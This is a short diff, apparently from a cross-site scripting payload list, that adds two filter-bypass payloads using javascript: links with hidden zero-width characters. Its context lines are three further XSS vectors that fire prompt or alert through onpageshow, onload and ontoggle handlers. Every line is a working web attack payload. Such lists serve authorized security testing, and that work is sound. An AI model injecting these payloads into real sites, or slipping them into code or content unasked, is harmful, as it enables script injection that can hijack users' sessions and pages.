@@ -22,3 +22,5 @@
 "><Body/oNpagEshoW​=(prompt)(1)>
 "><svg only=1 onload=prompt(document.domain)>
 <details open ontoggle=alert('xss0r')>
+--'<00 foo="<a%20href="javascript​:prompt(404)">XSS-Click</00>--%20//
+'<00 foo="<a%20href="javascript​:alert('XSS-Bypass')">XSS-CLick</00>--%20/
